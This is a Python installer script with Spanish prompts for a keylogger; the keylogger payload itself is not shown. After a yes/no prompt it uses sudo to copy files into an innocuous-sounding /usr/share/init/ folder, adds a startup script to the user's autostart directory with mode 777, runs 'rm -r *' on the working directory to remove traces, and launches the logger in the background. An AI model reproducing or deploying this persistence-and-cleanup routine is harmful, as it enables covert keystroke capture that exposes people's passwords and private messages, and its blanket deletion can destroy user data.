import colorama
import os
import time

os.system("clear")

colorama.init()

print(colorama.Fore.RED + """ _  _________   ___    ___   ____  ____ _____ ____
| |/ / ____\\ \\ / / |   / _ \\ / ___|/ ___| ____|  _ \\
| ' /|  _|  \\ V /| |  | | | | |  _| |  _|  _| | |_) |
| . \\| |___  | | | |__| |_| | |_| | |_| | |___|  _ <
|_|\\_\\_____| |_| |_____\\___/ \\____|\\____|_____|_| \\_\\""")


answer = input("\nEste script instalará un keylogger en su PC. ¿Desea continuar? S/n").lower()

if answer == "" or answer == "s" or answer == "sí" or answer == "si":
	os.system("sudo mkdir /usr/share/init/")
	print("\n")
	os.system("echo Carpeta del keylogger creada")
	time.sleep(1)
	os.system("sudo cp -r * /usr/share/init/; echo Archivos copiados a la carpeta")
	time.sleep(1)
	os.system("sudo cp /usr/share/init/init.sh $HOME/.config/autostart-scripts/; echo Archivo para\
		iniciar el keylogger agregado al inicio")
	time.sleep(1)
	os.system("sudo chmod 777 $HOME/.config/autostart-scripts/init.sh; echo Archivo marcado como\
		ejecutable")
	time.sleep(1)
	os.system("sudo rm -r *; echo Archivos de instalación eliminados")
	time.sleep(1)
	os.system("sh /usr/share/init/init.sh &")
	print("Instalación finalizada.")
	time.sleep(1)
	input("Presione intro para finalizar")
	os.system("clear")
	exit()
else:
	os.system("clear")
	exit()
